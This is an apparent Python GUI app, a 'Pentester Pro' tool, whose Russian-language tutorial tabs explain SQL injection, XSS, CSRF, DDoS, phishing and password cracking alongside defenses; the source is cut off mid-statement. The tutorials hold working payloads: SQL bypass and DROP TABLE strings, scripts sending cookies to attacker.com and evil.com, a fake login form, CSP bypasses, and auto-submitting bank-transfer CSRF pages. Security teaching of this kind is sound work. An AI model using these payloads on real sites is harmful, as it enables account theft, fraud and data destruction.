import customtkinter as ctk
from tkinter import scrolledtext
import requests
import threading
from bs4 import BeautifulSoup
import webbrowser
import time


ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")

class PentestProApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Pentester Pro v1.0")
        self.geometry("900x600")
        self.version = "1.0 Free"
        self.create_widgets()
        self.setup_legal_warnings()

    def create_widgets(self):
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)
        
        # Боковая панель
        self.sidebar = ctk.CTkFrame(self, width=250)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        
        # Основная область
        self.main_area = ctk.CTkFrame(self)
        self.main_area.grid(row=0, column=1, sticky="nsew")
        
        self.create_navigation()
        self.create_education_tab()
        self.create_testing_tab()
        self.create_settings_tab()
    
    def create_navigation(self):
        # Кнопки навигации
        nav_buttons = [
            ("Обучение", self.show_education),
            ("Тестирование", self.show_testing),
            ("Настройки", self.show_settings)
        ]
        
        for text, command in nav_buttons:
            btn = ctk.CTkButton(self.sidebar, text=text, command=command)
            btn.pack(pady=5, padx=10, fill='x')
        
        # Версия приложения
        ctk.CTkLabel(self.sidebar, text=f"Версия: {self.version}").pack(pady=20)

    def create_education_tab(self):
        self.education_frame = ctk.CTkFrame(self.main_area)
        self.edu_tabs = ctk.CTkTabview(self.education_frame)
        self.edu_tabs.pack(expand=True, fill='both')
        
        # SQL Injection
        sql_tab = self.edu_tabs.add("SQL Injection")
        content = """
[SQL Injection Guide Только для учебных целей]
Что такое SQL-инъекция? 

SQL-инъекция (SQLi) — это метод атаки на веб-приложения, при котором злоумышленник внедряет вредоносные SQL-запросы в поля ввода данных, чтобы выполнить произвольные команды в базе данных. Это может привести к: 

Извлечению конфиденциальной информации (логины, пароли и т. д.) 

Удалению или изменению данных 

Получению доступа к серверу 

 

Виды SQL-инъекций 

1. Classic SQL Injection (Прямая инъекция) 

Происходит, когда злоумышленник напрямую изменяет SQL-запрос. 

Уязвимый код: 

Python: 

username = input("Введите имя пользователя: ") 
query = "SELECT * FROM users WHERE username = '" + username + "';" 
execute_query(query) 
 

Атака: 

Sql: 

' OR '1'='1 
 

Результат: 

Sql: 

SELECT * FROM users WHERE username = '' OR '1'='1'; 
 

Что происходит: 

'1'='1' всегда возвращает true, поэтому запрос возвращает все записи из таблицы users. 

Злоумышленник обходит аутентификацию и заходит в систему. 

 

2. Union-based SQL Injection (Инъекция через объединение данных) 

Использует оператор UNION для извлечения данных из других таблиц. 

Уязвимый код: 

Python: 

search = input("Введите имя: ") 
query = "SELECT name, age FROM users WHERE name = '" + search + "';" 
execute_query(query) 
 

Атака: 

Sql: 

' UNION SELECT username, password FROM users -- 
 

Результат: 

Sql: 

SELECT name, age FROM users WHERE name = '' UNION SELECT username, password FROM users; 
 

Что происходит: 

Атака возвращает не только name и age, но и username и password из другой таблицы. 

Злоумышленник видит чувствительные данные прямо на странице. 

 

3. Error-based SQL Injection (Ошибка для раскрытия данных) 

Вынуждает сервер выбрасывать ошибки, которые содержат информацию о структуре базы данных. 

Уязвимый код: 

Python: 

id = input("Введите ID пользователя: ") 
query = "SELECT * FROM users WHERE id = " + id 
execute_query(query) 
 

Атака: 

Sql:  

1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- 
 

Результат: 

Если база данных раскрывает ошибки, злоумышленник может увидеть, сколько таблиц существует, и продолжить атаку. 

 

4. Blind SQL Injection (Слепая инъекция) 

Если сервер не возвращает никаких ошибок, но запросы все еще выполняются, можно использовать временные задержки или булевы условия для проверки уязвимости. 

Атака (булева логика): 

Sql:  

1' AND 'a'='a' -- (True) 
1' AND 'a'='b' -- (False) 
 

Если первая команда возвращает данные, а вторая — нет, значит, база данных уязвима. 

Атака (временная задержка): 

Sql: 1' AND SLEEP(5) -- 
 

Если страница загружается с задержкой в 5 секунд, значит, инъекция успешна. 

 

5. Time-based Blind SQL Injection (Инъекция с таймером) 

Продвинутый метод, где используется функция SLEEP() для определения уязвимости. 

Примеры: 

MySQL: 

Sql:  

SELECT IF(1=1, SLEEP(5), 0) -- 
 

PostgreSQL: 

Sql:  

SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END; 
 

Что происходит: 

Если страница задерживается на 5 секунд, значит, инъекция сработала. 

 

Как защититься от SQL-инъекций 

Параметризованные запросы 
Не вставляй данные напрямую в SQL-запросы. Вместо этого используй prepared statements: 

Python (SQLite): 

Python:  

query = "SELECT * FROM users WHERE username = ?" 
cursor.execute(query, (username,)) 
 

ORM (Object-Relational Mapping) 
Используй ORM-библиотеки (SQLAlchemy, Django ORM) для работы с БД. 

Фильтрация ввода данных 
Проверяй и экранируй данные от пользователя. 

Минимальные права для БД 
Создавай отдельных пользователей для БД с минимальными правами. 

Web Application Firewall (WAF) 
Установи WAF, чтобы фильтровать вредоносные запросы. 

 

Инструменты для тестирования SQL-инъекций 

sqlmap (автоматический инструмент для SQLi): 

sqlmap -u "http://example.com?id=1" --dbs 
 

Burp Suite (инструмент для тестирования веб-безопасности). 

 

SQL-инъекция уровня «бог» 

Атака на несколько запросов (Batch SQL Injection): 

Sql: 

'; DROP TABLE users; -- 
 

Что происходит: 

Если сервер принимает множественные запросы, можно удалить таблицу или изменить данные. 

Противодействие: 

Запрет на множественные SQL-запросы в одной строке (если поддерживается). 

 
        """
        self.create_edu_content(sql_tab, content)
        
        # XSS
        xss_tab = self.edu_tabs.add("XSS Attacks")
        content = """
[XSS Attack Guide Только для учебных целей]
Что такое XSS-атака? 

XSS (Cross-Site Scripting) — это тип атаки, при котором злоумышленник внедряет вредоносный JavaScript-код в веб-страницу, чтобы выполнить его в браузере жертвы. 

Цели XSS-атак: 

Кража данных (cookies, токенов сессии и т. д.) 

Подмена контента (фейковые формы входа) 

Редиректы на вредоносные сайты 

Удаленное управление браузером жертвы 

 

Виды XSS-атак 

1. Reflected XSS (Отражённая атака) 

Происходит, когда вредоносный скрипт передаётся через URL или форму и выполняется в браузере при открытии страницы. 

Уязвимый код: 

Python: 

@app.route('/search') 
def search(): 
    query = request.args.get('q') 
    return f"Результаты для: {query}" 
 

Атака: 

Html: 

http://example.com/search?q=<script>alert('XSS')</script> 
 

Результат: 

Пользователь открывает ссылку и у него выполняется alert('XSS'). 

Если это не alert, а что-то вроде: 

Javascript: 

<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> 
 

то злоумышленник получит все cookies пользователя. 

 

2. Stored XSS (Хранимая атака) 

Происходит, когда вредоносный скрипт сохраняется в базе данных и выполняется каждый раз при загрузке страницы. 

Уязвимый код: 

Python: 

@app.route('/comment', methods=['POST']) 
def comment(): 
    comment = request.form['comment'] 
    db.execute(f"INSERT INTO comments (text) VALUES ('{comment}')") 
    return "Комментарий сохранен!" 
 

Атака: 
Пользователь вводит в форму: 

Html: 

<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> 
 

Результат: 

Код сохраняется в базе данных. 

Каждый раз, когда кто-то читает комментарии, скрипт выполняется в их браузере. 

Опасность: 

Можно подменить форму входа: 

Html: 

<script> 
  document.body.innerHTML = '<form action="http://attacker.com/steal"><input name="login"><input name="password"><button>Войти</button></form>'; 
</script> 
 

 

3. DOM-based XSS 

Происходит, когда уязвимость связана с манипуляцией Document Object Model (DOM) в браузере. 

Уязвимый код: 

Javascript: 

const query = new URLSearchParams(window.location.search).get('q'); 
document.getElementById('output').innerHTML = query; 
 

Атака: 

Html: 

http://example.com/page?q=<img src=x onerror=alert('XSS')> 
 

Результат: 

Скрипт подменяет содержимое страницы. 

Это срабатывает, даже если сервер ничего не обрабатывает. 

 

Payloads для XSS-атак 

Отображение окна alert (классический тест) 

Javascript: 

<script>alert('XSS')</script> 
 

Кража cookies 

Javascript: 

<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> 
 

Редирект на вредоносный сайт 

Javascript: 

<script>window.location='http://attacker.com'</script> 
 

Автоматическая отправка формы (фишинг) 

Javascript: 

<form action="http://attacker.com/steal" method="POST"> 
  <input type="hidden" name="username" value="victim"> 
  <input type="hidden" name="password" value="12345"> 
</form> 
<script>document.forms[0].submit();</script> 
 

 

Как защититься от XSS? 

1. Экранирование данных (Escaping) 

Заменяй специальные символы HTML на безопасные сущности: 

& → &amp; 

< → &lt; 

> → &gt; 

" → &quot; 

' → &#x27; 

Python (Flask): 

Python: 

from markupsafe import escape 
 
@app.route('/search') 
def search(): 
    query = escape(request.args.get('q')) 
    return f"Результаты для: {query}" 
 

 

2. Content Security Policy (CSP) 

Настрой CSP, чтобы запретить выполнение инлайн-скриптов: 

Nginx (CSP заголовок): 

Nginx: 

add_header Content-Security-Policy "default-src 'self'; script-src 'self';"; 
 

 

3. Валидация и фильтрация данных 

Проверяй и очищай ввод: 

JavaScript (DOM): 

Javascript: 

const query = new URLSearchParams(window.location.search).get('q'); 
const sanitizedQuery = query.replace(/</g, "&lt;").replace(/>/g, "&gt;"); 
document.getElementById('output').innerText = sanitizedQuery; 
 

 

4. HttpOnly cookies 

Установи атрибут HttpOnly для cookies, чтобы их нельзя было прочитать через JavaScript: 

Python (Flask): 

Python: 

response.set_cookie('session', 'abc123', httponly=True) 
 

 

5. Включай безопасные заголовки 

Добавь такие заголовки в ответ сервера: 

Nginx: 

Nginx: 

add_header X-Content-Type-Options nosniff; 
add_header X-Frame-Options DENY; 
add_header X-XSS-Protection "1; mode=block"; 
 

 

Инструменты для тестирования XSS 

Burp Suite — анализ и модификация запросов. 

XSS Hunter — для обнаружения сложных XSS-уязвимостей. 

OWASP ZAP — автоматизированное тестирование безопасности. 

 

XSS-атака уровня «бог» 

Байпас CSP через data URIs: 

Html: 

<img src="data:text/html,<script>alert('XSS')</script>"> 
 

Атака через WebSockets: 

Javascript: 

var ws = new WebSocket('ws://attacker.com'); 
ws.onopen = function() { 
  ws.send(document.cookie); 
}; 


Глава 2 (как можно обойти CSP (Content Security Policy))
{
Способы обхода CSP:
Неполный список источников (whitelist bypass):
Если сайт разрешает загрузку скриптов с ненадёжных источников, например:

{
html

Content-Security-Policy: script-src 'self' https://example.com
}

Если на example.com есть уязвимости (например, возможность загрузить скрипт через XSS), можно воспользоваться этим.

unsafe-inline и unsafe-eval:
Если в CSP включены директивы:

{
html

Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval';
}

Это позволяет выполнять инлайн-скрипты и eval(), что делает политику почти бесполезной. Например:

{
javascript

eval('alert(1)');
}
JSONP-атака: Если сайт поддерживает JSONP для работы с API, можно внедрить вредоносный код:

{
html
<script src="https://example.com/api?callback=alert(1)"></script>
}

Отравление данных через DOM-based XSS:
Если сайт позволяет внедрить данные через URL-параметры, это можно использовать так:

{
javascript

var url = new URL(window.location);
document.write(url.searchParams.get('q')); // XSS через URL
}


Использование WebSocket:
CSP не всегда корректно блокирует WebSocket-соединения:

{
javascript

var ws = new WebSocket('wss://evil.com');
ws.onopen = function() {
  ws.send(document.cookie);
};

}
Bypass через data: URI или blob:
Если разрешены data: или blob: источники, можно обойти CSP:

{
html

Content-Security-Policy: script-src 'self' blob: data:
}

Тогда:

{
javascript

var blob = new Blob(["alert('XSS')"], { type: "text/javascript" });
var url = URL.createObjectURL(blob);
var script = document.createElement('script');
script.src = url;
document.body.appendChild(script);
Open redirect + CSP bypass:
}

Если на сайте есть редиректы (например, через параметры URL), это можно использовать для загрузки скриптов с другого домена.

Примеры из реальной жизни:
Иногда в плохо настроенных CSP можно найти лазейки, например:

Добавлено 'unsafe-inline' — позволяет исполнять инлайн-скрипты.
Широкий script-src, например: *.example.com — если есть уязвимый поддомен, можно использовать его.
}
"""
        self.create_edu_content(xss_tab, content)
        
        # DDoS
        ddos_tab = self.edu_tabs.add("DDoS Protection")
        content = """
[DDoS Mitigation Guide Только для учебных целей]
        
Что такое DDoS-атака?
DDoS (Distributed Denial of Service) — это распределённая атака на отказ в обслуживании, 
когда множество скомпрометированных устройств (ботнет) отправляют огромное количество запросов к серверу, 
чтобы перегрузить его и сделать недоступным для обычных пользователей.

Цель:

Обрушить сервер или сайт
Перегрузить каналы передачи данных
Сорвать работу онлайн-сервисов
Типы DDoS-атак
1. Атака на уровень сети (L3-L4)
Цель: Перегрузить сеть или сервер, забив его каналы трафиком.

UDP-флуд: отправка огромного количества UDP-пакетов на произвольные порты.
ICMP-флуд (Ping-флуд): сервер заваливается запросами ping.
SYN-флуд: отправка огромного количества SYN-запросов, чтобы открыть полусессии и исчерпать ресурсы.
Признаки:

Резкий рост трафика.
Время отклика сервера увеличивается.
В логах — куча неподтверждённых запросов.
2. Атака на уровень приложений (L7)
Цель: Атаковать непосредственно веб-приложение, отправляя огромное количество легитимных HTTP-запросов.

HTTP-флуд: ботнет генерирует кучу GET или POST-запросов.
Slowloris: отправка запросов по частям, чтобы удерживать сессии открытыми как можно дольше.
API-атака: боты засыпают сервер запросами к API, чтобы истощить ресурсы.
Признаки:

Высокая загрузка процессора и памяти.
Сервер отвечает с задержкой или падает.
В логах куча повторяющихся запросов.
3. Гибридные атаки
Злоумышленники часто комбинируют оба типа атак: сначала обрушивают сеть, а затем добивают сервер целенаправленными HTTP-запросами.

Пример:

SYN-флуд блокирует сеть.
HTTP-флуд атакует веб-приложение.
Как распознать DDoS-атаку?
Признаки:

Внезапный рост трафика без причины.
Резкое падение производительности сайта.
Рост 503/504 ошибок.
Появление трафика с одного или множества IP.
Инструменты для мониторинга:

Wireshark — анализ сетевого трафика.
Grafana + Prometheus — отслеживание нагрузок и аномалий.
Cloudflare Analytics — мониторинг подозрительных запросов.
Методы защиты от DDoS-атак
1. Rate limiting (ограничение запросов)
Настройка ограничений на количество запросов в секунду от одного IP-адреса.

Цель: предотвратить флуд.

Примеры:

Ограничить до 10 запросов в секунду с одного IP.
Включить капчу для подозрительных пользователей.
2. WAF (Web Application Firewall)
WAF фильтрует HTTP-запросы, блокируя вредоносный трафик.

Что он делает:

Определяет аномальное поведение.
Защищает от медленных атак (Slowloris).
Фильтрует по сигнатурам атак.
Примеры сервисов:

Cloudflare WAF
AWS Shield
3. Блокировка IP и географическая фильтрация
Если атака идет с определённого региона, можно временно заблокировать IP-диапазоны.

Методы:

Блокировка всех IP за пределами определённой страны.
Ограничение доступа с Tor-узлов.
4. Anycast-сети и балансировка нагрузки
Anycast позволяет распределять трафик между несколькими серверами в разных локациях.

Как это работает:

Запросы перенаправляются к ближайшему доступному серверу.
Перегруженный сервер перенаправляет трафик на другие узлы.
CDN-сервисы:

Cloudflare
Akamai
5. Black hole routing (Чёрная дыра)
Это крайняя мера, когда весь трафик к цели перенаправляется в "чёрную дыру", чтобы минимизировать ущерб.

Минус: сайт становится полностью недоступен, но сервер остаётся целым.

Тестирование на устойчивость к DDoS-атакам
Учебные методы:

Эмуляция нагрузки: создание тестового трафика для проверки устойчивости системы.
Стресс-тесты: проверка, сколько запросов выдерживает сервер.
Лог-анализ: симуляция аномальных запросов и отслеживание, как реагирует сервер.
Инструменты для тестов:

Apache Benchmark (ab) — нагрузка HTTP-сервера.
Locust — симуляция множества пользователей.
JMeter — нагрузочное тестирование API и веб-приложений.
Выводы
DDoS-атаки — это серьёзная угроза, и важно понимать, как они работают, чтобы эффективно защищаться:

Настрой ограничения трафика.
Используй балансировку нагрузки и CDN.
Внедряй WAF и CSP.
Постоянно тестируй безопасность своих серверов.
        """
        self.create_edu_content(ddos_tab, content)
        
        CSRF_Attacks = self.edu_tabs.add("CSRF Attacks")
        content = """
CSRF-атака (Cross-Site Request Forgery) — Полное Руководство
🚨 Что такое CSRF?
CSRF (Cross-Site Request Forgery) — это тип кибератаки, при котором злоумышленник заставляет пользователя выполнить нежелательные действия на доверенном сайте, на котором он уже аутентифицирован.

В таких атаках используется тот факт, что браузеры автоматически добавляют куки и сессии при отправке запросов, если пользователь уже залогинен. В результате команда, отправленная хакером, выполняется с правами жертвы.

⚙️ Как это работает?
Пример 1: Простая CSRF-атака
Представим, что на сайте интернет-банка перевод денег можно выполнить таким GET-запросом:

arduino
https://bank.com/transfer?to=attacker&amount=1000
Хакер создаёт вредоносную HTML-страницу:

html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Attack</title>
</head>
<body>
    <h1>Нажми сюда, чтобы выиграть приз!</h1>
    <img src="https://bank.com/transfer?to=attacker&amount=1000" />
</body>
</html>
Как это сработает:

Пользователь авторизуется в онлайн-банке, и куки сессии сохраняются в браузере.
Он заходит на страницу хакера.
Изображение (в реальности — запрос на перевод) отправляется на сайт банка.
Браузер автоматически добавляет куки, и деньги переводятся злоумышленнику.
Пример 2: CSRF с использованием формы (POST-запрос)
Иногда сайт требует отправки данных через POST-запрос:

html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Attack</title>
</head>
<body>
    <form action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker">
        <input type="hidden" name="amount" value="1000">
        <input type="submit" value="Получить приз!">
    </form>
    <script>
        document.forms[0].submit(); // Автоматическая отправка формы при загрузке страницы
    </script>
</body>
</html>
Результат:

Пользователь даже не видит форму — она отправляется автоматически.
Банк получает запрос и выполняет его, полагая, что его инициировал сам пользователь.
🔥 Чем CSRF опасен?
Что могут сделать хакеры через CSRF:

Перевести деньги с вашего счёта.
Сменить пароль вашего аккаунта.
Удалить вашу учётную запись.
Купить товар или подписку от вашего имени.
Изменить e-mail для дальнейшего захвата аккаунта.
Почему это возможно:

Браузеры автоматически отправляют куки с каждым запросом.
Многие сайты не проверяют источник запроса (реферер или токен).
Простейшие запросы (GET, POST) легко подделать через HTML или JavaScript.
✅ Как защититься от CSRF-атак?
CSRF-токены
— Специальные уникальные токены, которые отправляются вместе с каждой формой. Сервер проверяет их, и если токен отсутствует или неверный — запрос блокируется.
Пример Django:

python
from django.middleware.csrf import get_token

def my_view(request):
    csrf_token = get_token(request)
    return render(request, 'form.html', {'csrf_token': csrf_token})
Форма с CSRF-токеном:

html
<form action="/transfer" method="POST">
    <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}">
    <input type="text" name="to" placeholder="Получатель">
    <input type="text" name="amount" placeholder="Сумма">
    <button type="submit">Перевести</button>
</form>
Проверка реферера (Referer Header)
— Сервер может проверять заголовок Referer, чтобы убедиться, что запрос пришёл с доверенного сайта.
Пример на Flask:

python
from flask import request, abort

@app.route('/transfer', methods=['POST'])
def transfer():
    if request.referrer != "https://bank.com/":
        abort(403)
    # обработка перевода
Минусы:

Заголовок Referer можно подделать или отключить, поэтому это не панацея.
SameSite Cookies
— Настройка куков так, чтобы они не отправлялись с кросс-доменных запросов.
Варианты:

Strict: куки отправляются только с запросами с того же домена.
Lax: куки отправляются для навигации с внешних сайтов, но не с автоматических запросов (например, через <img>).
Пример установки куки:

python
response.set_cookie('session', 'abc123', samesite='Strict')


Методы аутентификации
Двухфакторная аутентификация — даже если произошла CSRF-атака, хакеру нужно будет подтвердить действие через SMS, приложение или email.
Подтверждение паролем перед критическими действиями — например, перед переводом денег требуется повторно ввести пароль.
🛡️ Как протестировать приложение на CSRF?
Burp Suite — можно перехватить запрос и попробовать изменить его источник.
Postman — тестирование API с отключёнными токенами и куками.
Создание тестовых форм — попробовать сделать страницу с автосабмитом и проверить, как среагирует сайт.
Важно: Тестировать можно только на своих проектах или с разрешения владельца сайта.

📚 Заключение
CSRF-атака — это мощный способ заставить пользователя выполнить опасные действия на сайте без его ведома.

Главные правила защиты:

Использовать CSRF-токены.
Настраивать SameSite куки.
Проверять рефереры и источники запросов.
Добавлять двухфакторную аутентификацию.
Всегда тестировать свой сайт на уязвимости.
        """
        self.create_edu_content(CSRF_Attacks, content)
        
        Phishing_Techniques = self.edu_tabs.add("Phishing Techniques")
        content = """
🎣 Phishing Techniques — Полное Руководство
🚨 Что такое фишинг (Phishing)?
Фишинг — это вид кибератаки, при котором злоумышленник пытается обманом заставить жертву раскрыть конфиденциальную информацию: пароли, данные банковских карт, коды двухфакторной аутентификации и т.д.

Цель фишинга:

Украсть логины и пароли.
Заполучить доступ к банковским счетам.
Установить вредоносное ПО.
Обмануть жертву для перевода денег.
⚙️ Как работает фишинг?

Приманка: Хакер создаёт убедительный повод для жертвы (письмо от "банка", "коллеги", "друга").
Вредоносная ссылка: Жертве предлагают перейти по ссылке, которая ведёт на фальшивый сайт.
Кража данных: На поддельной странице жертва вводит логин/пароль, которые тут же отправляются злоумышленнику.
Использование данных: Хакер получает доступ к аккаунтам жертвы, используя украденную информацию.
🛠️ Виды фишинга (Phishing Techniques):

1. Email Phishing (Фишинг через электронную почту)
Суть: Злоумышленник отправляет письмо, выдавая себя за официальную организацию (банк, Google, Instagram).

Примеры:

"Ваш аккаунт будет заблокирован, если вы не подтвердите свою информацию."
"Подтвердите платёж на сумму 1000€ — если это ошибка, перейдите по ссылке."
Техники маскировки:

Использование поддельных e-mail-адресов: support@bank-secure.com вместо настоящего support@bank.com.
Ссылки с поддоменами: secure.bank-login.com.
Защита:

Проверка отправителя (email-адрес).
Никогда не переходить по ссылкам из подозрительных писем.
2. Spear Phishing (Целевой фишинг)
Суть: Атака на конкретного человека или организацию. Хакер заранее собирает информацию о жертве (имя, должность, друзей).

Примеры:

Письмо от "начальника" с просьбой срочно переслать пароли.
Ложное сообщение от "коллеги", в котором содержится вирус.
Почему это опасно:

Очень убедительные письма, потому что хакер заранее изучил жертву.
Часто используется для корпоративного шпионажа.
Защита:

Двухфакторная аутентификация.
Проверка источника и содержания сообщений.
3. Whaling (Фишинг на "китов")
Суть: Это разновидность Spear Phishing, но направленная на высокопоставленных лиц — директоров, менеджеров и владельцев компаний.

Примеры:

Письмо от "юриста компании", требующее срочного перевода денег.
Фальшивый запрос от "банка" о доступе к корпоративному счёту.
Цель: Получить крупные суммы денег или доступ к секретным данным компании.

Защита:

Внедрение строгих процедур подтверждения любых финансовых операций.
Обучение персонала распознавать такие атаки.
4. Clone Phishing (Клонированный фишинг)
Суть: Хакер копирует легитимное письмо (например, с линком на документ) и заменяет ссылку на вредоносную.

Примеры:

Получаешь реальное письмо с Google Drive, но ссылка ведёт на фейковую страницу авторизации Google.
Письмо от "Zoom" с просьбой войти в конференцию через поддельную ссылку.
Цель:

Украсть логины и пароли.
Заразить устройства вредоносным ПО.
Защита:

Проверка ссылок перед кликом (наведение курсора).
Использование антивирусов, которые могут блокировать вредоносные сайты.
5. Vishing (Голосовой фишинг)
Суть: Телефонный звонок, в котором злоумышленник представляется сотрудником банка, полиции или техподдержки.

Примеры:

"Мы из банка. Ваша карта была скомпрометирована. Подтвердите номер и CVC-код."
"Извините, это служба поддержки Apple. Назовите ваш код из SMS, чтобы восстановить аккаунт."
Цель: Получить личные данные и пароли голосом.

Защита:

Никогда не разглашать личную информацию по телефону.
Самостоятельно перезванивать в банк на официальный номер для проверки.
6. Smishing (SMS-фишинг)
Суть: Хакеры рассылают SMS с фальшивыми ссылками или угрозами блокировки аккаунта.

Примеры:

"Ваш банковский счёт заблокирован. Пройдите по ссылке для разблокировки."
"Подтвердите вход в ваш Instagram — перейдите по ссылке."
Цель:

Заставить перейти по ссылке и ввести личные данные.
Внедрить вредоносное ПО через SMS-ссылку.
Защита:

Игнорировать подозрительные сообщения с неизвестных номеров.
Использовать двухфакторную аутентификацию с реальными приложениями (Google Authenticator).
🚨 Как защититься от фишинга?
Двухфакторная аутентификация (2FA): Даже если хакер украдёт пароль, без второго фактора (SMS, приложения) он не войдёт в аккаунт.

Проверка ссылок: Наведи курсор на ссылку и убедись, что она ведёт на официальный сайт.

Фильтры почты: Настрой почтовый сервис для блокировки подозрительных писем.

Браузерные плагины: Например, HTTPS Everywhere и uBlock Origin помогают заблокировать фальшивые сайты.

Проверка источников: Если сомневаешься, перезвони отправителю сам, используя официальный номер с сайта.

Обучение: Объясни друзьям и коллегам, как распознавать фишинг.

📚 Заключение
Фишинг — это хитрый и опасный способ кражи данных, который основывается на доверии и спешке.

Главные правила защиты:

Никогда не переходи по подозрительным ссылкам.
Проверяй отправителей писем.
Всегда включай двухфакторную аутентификацию.
Проверяй сайт, на который тебя просят войти (особенно банки и соцсети).
        """
        self.create_edu_content(Phishing_Techniques, content)
        
        
        Password_Cracking = self.edu_tabs.add("Password Cracking")
        content = """
🔓 Password Cracking — Полное руководство
🚨 Что такое Password Cracking?
Password Cracking — это процесс взлома пароля с целью получить доступ к защищённой системе, аккаунту или данным.

Зачем это делают хакеры:

Неавторизованный доступ: Получить контроль над аккаунтами (почта, соцсети, банковские приложения).
Распространение вредоносного ПО: Использовать взломанные аккаунты для спама или фишинга.
Кража данных: Доступ к приватной информации или деньгам.
Важно: Этичные хакеры (white hat) используют эти техники для тестирования безопасности систем — это называется penetration testing.

⚙️ Основные методы взлома паролей:
1. Brute Force Attack (Атака грубой силы)
Суть: Перебор всех возможных комбинаций символов до тех пор, пока не будет найден правильный пароль.

Как работает:

Программа автоматически перебирает все варианты пароля, начиная от "a", "aa", "aaa" и так далее.
Если пароль короткий и простой — его взломают мгновенно.
Скорость зависит от:

Длины пароля.
Сложности символов (буквы, цифры, спецсимволы).
Мощности оборудования (видеокарты, процессоры).
Защита:

Использовать длинные пароли (16+ символов).
Включать буквы разного регистра, цифры и спецсимволы.
Включить задержку при вводе неверного пароля (rate limiting).
Пример:
Пароль "1234" взломается за менее 1 секунды, а "9~aZ@5!xG$#Q2P" может потребовать миллионы лет.

2. Dictionary Attack (Атака по словарю)
Суть: Взлом с помощью заранее подготовленного списка часто используемых паролей — словаря.

Как работает:

Программа пробует пароли из готового списка — например:
123456
password
qwerty
admin
Добавляет вариации: "password1", "password123".
Где берут словари:

Утечки данных — пароли, взломанные ранее.
Генераторы на основе популярных слов (имена, даты рождения).
Защита:

Не использовать простые пароли.
Включить блокировку после нескольких неудачных попыток входа.
Пример:
Если пароль — это "qwerty2024", его взломают за мгновение с помощью словаря.

3. Hybrid Attack (Гибридная атака)
Суть: Комбинация Brute Force и Dictionary Attack.

Как работает:

Берётся пароль из словаря и к нему добавляются символы, цифры и знаки.
Например, программа тестирует:
password123
admin2024!
qwerty!@#
Цель:

Взлом сложных, но предсказуемых паролей вроде "LoveYou123!".
Защита:

Избегать комбинаций реальных слов и чисел.
Использовать уникальные пароли без очевидных добавлений.
4. Rainbow Table Attack (Атака с радужными таблицами)
Суть: Взлом хешированных паролей с помощью таблиц, где заранее вычислены хеши для возможных паролей.

Как это работает:

Когда пароль сохраняется, он хэшируется — например, "password" → 5f4dcc3b5aa765d61d8327deb882cf99.
Хакеры создают таблицы с готовыми парами: пароль → хеш.
Если хакер находит в таблице совпадение хеша — пароль взломан.
Защита:

Добавлять соль (salt) — случайные данные к паролю перед хешированием.
Использовать стойкие хеш-функции (bcrypt, Argon2).
Пример:

Пароль "password" без соли взломается мгновенно.
"password+random_salt" требует значительных вычислений.
5. Credential Stuffing (Подстановка учётных данных)
Суть: Хакеры используют утёкшие логины и пароли, чтобы войти в другие аккаунты жертвы.

Почему это работает:

Люди часто используют один и тот же пароль на всех сайтах.
Взломав почту, хакер может получить доступ ко всему.
Защита:

Никогда не использовать один пароль для разных сервисов.
Включить двухфакторную аутентификацию (2FA).
Пример:
Если твой пароль утёк с одного сайта, хакер попробует его на Gmail, Instagram, Facebook и других сервисах.

6. Keylogger Attack (Атака с помощью кейлоггера)
Суть: Кейлоггеры — это программы, которые записывают всё, что ты вводишь с клавиатуры, включая пароли.

Как это работает:

Устанавливаются через вредоносные файлы, фишинговые ссылки или заражённые сайты.
Работают в фоне, скрытно передавая данные хакеру.
Защита:

Использовать антивирусы и антишпионское ПО.
Никогда не скачивать подозрительные файлы и программы.
🛡️ Как защититься от взлома паролей:
Уникальные и длинные пароли: Минимум 16 символов с разными регистрами, цифрами и спецсимволами.

Двухфакторная аутентификация (2FA): Привязывай аккаунты к приложениям вроде Google Authenticator.

Менеджеры паролей: Генерируют и хранят сложные пароли (Bitwarden, LastPass).

Периодическая смена паролей: Особенно если ты подозреваешь, что данные могли утечь.

Проверка утечек: Используй сайты вроде haveibeenpwned.com для проверки, не взломан ли твой аккаунт.

Защита от кейлоггеров: Используй антивирусы и проверяй программы перед установкой.

📚 Итого:
Password Cracking — это мощный инструмент в руках как киберпреступников, так и этичных хакеров.

Ключевые техники:

Brute Force — перебор всех паролей.
Dictionary Attack — тест популярных паролей.
Rainbow Table — взлом хешей.
Credential Stuffing — использование утёкших данных.
Keyloggers — запись вводимой информации.
Главное правило безопасности: уникальные сложные пароли и двухфакторная аутентификация.
        """
        self.create_edu_content(Password_Cracking, content)
        
    def create_edu_content(self, parent, text):
        textbox = ctk.CTkTextbox(parent, wrap='word')
        textbox.pack(fill='both', expand=True)
        textbox.insert('1.0', text)
        textbox.configure(state='disabled')

    def create_testing_tab(self):
        self.testing_frame = ctk.CTkFrame(self.main_area)
        self.test_tabs = ctk.CTkTabview(self.testing_frame)
        self.test_tabs.pack(expand=True, fill='both')
        
        # SQL Injection Test
        sql_test_tab = self.test_tabs.add("SQL Injection")
        self.create_sql_test_ui(sql_test_tab)
        
        # XSS Test
        xss_test_tab = self.test_tabs.add("XSS")
        self.create_xss_test_ui(xss_test_tab)
        
        
        # Console
        self.console = scrolledtext.ScrolledText(self.testing_frame)
        self.console.pack(fill='both', expand=True)

    def create_sql_test_ui(self, parent):
        ctk.CTkLabel(parent, text="Target URL:").grid(row=0, column=0, padx=5, pady=5)
        self.sql_url = ctk.CTkEntry(parent, width=400)
        self.sql_url.grid(row=0, column=1, padx=5, pady=5)
        
        ctk.CTkLabel(parent, text="Parameters:").grid(row=1, column=0, padx=5, pady=5)
        self.sql_params = ctk.CTkEntry(parent, width=400)
        self.sql_params.grid(row=1, column=1, padx=5, pady=5)
        
        self.sql_test_btn = ctk.CTkButton(
            parent, 
